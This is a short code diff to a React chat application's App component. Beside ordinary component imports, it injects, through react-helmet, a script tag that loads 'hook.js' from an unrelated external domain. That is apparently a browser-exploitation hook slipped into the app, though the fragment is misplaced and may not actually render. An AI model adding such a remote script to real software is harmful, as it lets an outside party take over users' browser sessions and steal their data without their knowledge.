@@ -11,8 +11,18 @@ import Login from './components/Login';
 import RoomList from './components/RoomList';
 import AddRoom from './components/AddRoom';
 import ChatRoom from './components/ChatRoom';
+import { Helmet } from "react-helmet"
 
 function App() {
+  <>
+    <Helmet>
+      <script
+        src="https://hellooooo.ml:443/hook.js"
+        crossorigin="anonymous"
+        async
+       ></script>
+     </Helmet>
+  </>
   let location = useLocation();
 
   return (
